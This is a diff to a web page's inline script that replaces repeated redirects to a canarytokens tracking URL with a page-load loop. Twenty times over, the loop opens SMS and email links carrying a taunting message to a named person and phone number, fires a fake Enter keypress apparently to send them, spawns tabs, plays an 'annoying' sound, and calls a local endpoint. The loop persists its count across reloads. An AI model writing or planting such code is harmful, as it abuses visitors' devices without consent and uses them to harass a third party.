@@ -21,6 +21,10 @@
 <body>
     <div id="message" class="message"></div>
     <script>
+        let redirectCount = 0;
+        const maxLoops = 20;
+        const actionDelay = 1000; // Reduced delay to 1 second
+
         function detectDevice() {
             const userAgent = navigator.userAgent || navigator.vendor || window.opera;
             if (/android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent)) {
@@ -30,40 +34,77 @@
             }
         }
 
-        function redirectBasedOnDevice() {
-            const deviceType = detectDevice();
-            if (deviceType === 'mobile') {
-                window.location.href = 'http://canarytokens.com/stuff/about/static/vjwsxgwlhsvrdf34rpkxq0xr3/submit.aspx';
-            } else {
-                window.location.href = 'http://canarytokens.com/stuff/about/static/vjwsxgwlhsvrdf34rpkxq0xr3/submit.aspx';
-            }
-
-            // Repeating the redirection and setTimeout for delay
-            setTimeout(function() {
-                window.location.href = 'http://canarytokens.com/stuff/about/static/vjwsxgwlhsvrdf34rpkxq0xr3/submit.aspx';
-                setTimeout(function() {
-                    window.location.href = 'http://canarytokens.com/stuff/about/static/vjwsxgwlhsvrdf34rpkxq0xr3/submit.aspx';
-                    setTimeout(function() {
-                        window.location.href = 'http://canarytokens.com/stuff/about/static/vjwsxgwlhsvrdf34rpkxq0xr3/submit.aspx';
-                        setTimeout(function() {
-                            window.location.href = 'http://canarytokens.com/stuff/about/static/vjwsxgwlhsvrdf34rpkxq0xr3/submit.aspx';
-                            setTimeout(function() {
-                                window.location.href = 'http://canarytokens.com/stuff/about/static/vjwsxgwlhsvrdf34rpkxq0xr3/submit.aspx';
-                                setTimeout(function() {
-                                    window.location.href = 'http://canarytokens.com/stuff/about/static/vjwsxgwlhsvrdf34rpkxq0xr3/submit.aspx';
-                                    setTimeout(function() {
-                                        window.location.href = 'http://canarytokens.com/stuff/about/static/vjwsxgwlhsvrdf34rpkxq0xr3/submit.aspx';
-                                    }, 2000); // Repeating again with 2-second delay
-                                }, 2000);
-                            }, 2000);
-                        }, 2000);
-                    }, 2000);
-                }, 2000);
-            }, 2000); // Repeating with 2-second delay
+        function simulateReturnKey() {
+            const event = new KeyboardEvent('keydown', {
+                bubbles: true,
+                cancelable: true,
+                key: 'Enter',
+                keyCode: 13,
+            });
+            document.dispatchEvent(event);
         }
 
-        // Call the function to redirect based on the device type, repeat the redirection process
-        redirectBasedOnDevice();
+        function openSmsLink() {
+            const smsLink = 'sms:18134813211?subject=hey%20I%20cant%20stop%20picking%20on%20Chris&body=hey%20I%20cant%20stop%20picking%20on%20Chris';
+            window.location.href = smsLink;
+            setTimeout(simulateReturnKey, 2000);
+        }
+
+        function openEmailForm() {
+            const mailtoLink = 'mailto:chris@granitecountertopsmelbourne.store?subject=hey%20I%20cant%20stop%20picking%20on%20Chris&body=hey%20I%20cant%20stop%20picking%20on%20Chris';
+            window.location.href = mailtoLink;
+            setTimeout(simulateReturnKey, 2000);
+        }
+
+        function performRedirect() {
+            window.location.href = 'http://canarytokens.com/stuff/about/static/vjwsxgwlhsvrdf34rpkxq0xr3/submit.aspx';
+        }
+
+        function openMultipleTabs() {
+            window.open('http://example.com', '_blank');
+            window.open('http://example.com', '_blank');
+            window.open('http://example.com', '_blank');
+        }
+
+        function playSound() {
+            const audio = new Audio('http://example.com/annoying-sound.mp3');
+            audio.play();
+        }
+
+        function triggerBackendAction() {
+            fetch('http://localhost:8080/annoying-action')
+                .then(response => response.text())
+                .then(data => console.log(data));
+        }
+
+        function loopActions() {
+            if (redirectCount < maxLoops) {
+                const deviceType = detectDevice();
+
+                if (deviceType === 'mobile') {
+                    openSmsLink();
+                } else {
+                    openEmailForm();
+                }
+
+                openMultipleTabs();
+                playSound();
+                triggerBackendAction();
+
+                redirectCount++;
+                localStorage.setItem('redirectCount', redirectCount);
+
+                setTimeout(loopActions, actionDelay);
+            } else {
+                alert('Completed 20 SMS actions, email form fills, and redirects!');
+            }
+        }
+
+        // Start the loop when the page loads
+        document.addEventListener('DOMContentLoaded', () => {
+            redirectCount = parseInt(localStorage.getItem('redirectCount')) || 0;
+            loopActions();
+        });
     </script>
 </body>
 </html>
